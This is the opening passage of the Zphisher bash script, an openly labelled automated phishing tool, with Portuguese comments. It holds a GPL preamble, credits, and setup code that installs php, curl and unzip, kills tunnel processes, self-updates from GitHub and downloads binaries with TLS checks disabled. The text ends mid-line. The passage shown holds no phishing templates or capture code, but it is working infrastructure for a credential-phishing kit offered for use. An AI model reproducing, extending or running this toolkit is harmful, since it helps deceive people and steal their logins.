#!/bin/bash

##   Zphisher 	: 	Ferramenta de Phishing Automatizada
##   Autor 	: 	TAHMID RAYAT 
##   Versão 	: 	2.3.5
##   Github 	: 	https://github.com/htr-tech/zphisher


##                   LICENÇA PÚBLICA GERAL GNU
##                    Versão 3, 29 de junho de 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Todos têm permissão para copiar e distribuir cópias verbatim
##    deste documento de licença, mas modificá-lo não é permitido.
##
##                         Preâmbulo
##
##    A Licença Pública Geral GNU é uma licença copyleft livre para
##    software e outros tipos de trabalhos.
##
##    As licenças para a maioria dos softwares e outros trabalhos práticos
##    são projetadas para tirar sua liberdade de compartilhar e alterar
##    esses trabalhos. Em contraste, a Licença Pública Geral GNU pretende
##    garantir sua liberdade de compartilhar e alterar todas as versões de
##    um programa — para garantir que ele permaneça software livre para todos
##    os seus usuários. Nós, a Free Software Foundation, usamos a Licença
##    Pública Geral GNU para a maioria de nosso software; ela se aplica
##    também a qualquer outro trabalho lançado desta forma por seus autores.
##    Você pode aplicá-la aos seus programas também.
##
##    Quando falamos de software livre, estamos nos referindo à liberdade,
##    não ao preço. Nossas Licenças Gerais Públicas são projetadas para
##    garantir que você tenha a liberdade de distribuir cópias do software
##    livre (e cobrar por elas se desejar), que você receba o código-fonte
##    ou possa obtê-lo se quiser, que possa alterar o software ou usar
##    partes dele em novos programas livres, e que saiba que pode fazer
##    essas coisas.
##
##    Para proteger seus direitos, precisamos impedir que outros neguem a
##    você esses direitos ou peçam para você renunciar a eles. Portanto,
##    você tem certas responsabilidades se distribuir cópias do software
##    ou se modificá-lo: responsabilidades para respeitar a liberdade dos
##    outros.
##
##    Por exemplo, se você distribuir cópias de tal programa, seja
##    gratuitamente ou mediante pagamento, você deve repassar aos
##    destinatários as mesmas liberdades que recebeu. Você deve garantir
##    que eles também recebam ou possam obter o código-fonte. E deve mostrar
##    a eles estes termos para que saibam seus direitos.
##
##    Desenvolvedores que usam a GPL protegem seus direitos com duas etapas:
##    (1) afirmam direitos autorais sobre o software; e (2) oferecem a você
##    esta Licença concedendo permissão legal para copiar, distribuir e/ou
##    modificar.
##
##    Para a proteção dos desenvolvedores e autores, a GPL explica claramente
##    que não há garantia para este software livre. Para o bem dos usuários
##    e dos autores, a GPL exige que versões modificadas sejam marcadas como
##    alteradas, para que seus problemas não sejam atribuídos incorretamente
##    aos autores de versões anteriores.
##
##    Alguns dispositivos são projetados para negar aos usuários acesso para
##    instalar ou executar versões modificadas do software neles, ainda que
##    o fabricante possa fazê-lo. Isso é fundamentalmente incompatível com
##    o objetivo de proteger a liberdade dos usuários de alterar o software.
##    O padrão sistemático de tal abuso ocorre na área de produtos para
##    indivíduos usarem, que é precisamente onde isso é mais inaceitável.
##    Portanto, projetamos esta versão da GPL para proibir a prática para
##    esses produtos. Se tais problemas surgirem substancialmente em outros
##    domínios, estamos prontos para estender essa disposição a esses domínios
##    em versões futuras da GPL, conforme necessário para proteger a liberdade
##    dos usuários.
##
##    Finalmente, todo programa está constantemente ameaçado por patentes
##    de software. Os estados não deveriam permitir patentes para restringir
##    o desenvolvimento e uso de software em computadores de uso geral, mas
##    nos que o fazem, queremos evitar o perigo especial de patentes aplicadas
##    a um programa livre poderem torná-lo efetivamente proprietário. Para
##    prevenir isso, a GPL garante que patentes não possam ser usadas para
##    tornar o programa não livre.
##
##    Os termos e condições precisos para cópia, distribuição e modificação
##    seguem.
##
##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
##

##   AGRADECIMENTOS A :
##   1RaY-1 - https://github.com/1RaY-1
##   Aditya Shakya - https://github.com/adi1090x
##   Ali Milani Amin - https://github.com/AliMilani
##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
##   Moises Tapia - https://github.com/MoisesTapia
##   Mr.Derek - https://github.com/E343IO
##   Mustakim Ahmed - https://github.com/bdhackers009
##   TheLinuxChoice - https://twitter.com/linux_choice


__version__="2.3.5"

## HOST & PORTA PADRÃO
HOST='127.0.0.1'
PORT='8080' 

## Cores ANSI (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Diretórios
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remover arquivo de log
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

## Terminar o script
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa interrompido." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa terminado." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Resetar cores do terminal
reset_color() {
	tput sgr0   # resetar atributos
	tput op     # resetar cor
	return
}

## Encerrar processo já em execução
kill_pid() {
	check_PID="php cloudflared loclx"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Verificar processo
			killall ${process} > /dev/null 2>&1 # Matar o processo
		fi
	done
}

# Verificar se há nova versão
check_update(){
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Verificando atualizações : "
	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"

	if [[ $new_version != $__version__ ]]; then
		echo -ne "${ORANGE}atualização encontrada\n"${WHITE}
		sleep 2
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Baixando atualização..."
		pushd "$HOME" > /dev/null 2>&1
		curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"

		if [[ -e ".zphisher.tar.gz" ]]; then
			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Ocorreu um erro ao extrair."; reset_color; exit 1; }
			rm -f .zphisher.tar.gz
			popd > /dev/null 2>&1
			{ sleep 3; clear; banner_small; }
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Atualizado com sucesso! Execute o zphisher novamente\n\n"${WHITE}
			{ reset_color ; exit 1; }
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Ocorreu um erro ao baixar."
			{ reset_color; exit 1; }
		fi
	else
		echo -ne "${GREEN}atualizado\n${WHITE}" ; sleep .5
	fi
}

## Verificar status da Internet
check_status() {
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Status da Internet : "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
}

## Banner
banner() {
	cat <<- EOF
		${ORANGE}
		${ORANGE} ______      _     _     _               
		${ORANGE}|___  /     | |   (_)   | |              
		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
		${ORANGE}      | |                                
		${ORANGE}      |_|                ${RED}Versão : ${__version__}

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Ferramenta criada por htr-tech (tahmid.rayat)${WHITE}
	EOF
}

## Banner pequeno
banner_small() {
	cat <<- EOF
		${BLUE}
		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
	EOF
}

## Dependências
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacotes necessários..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Pacotes já instalados."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Gerenciador de pacotes não suportado. Instale os pacotes manualmente."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

# Baixar Binários
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$
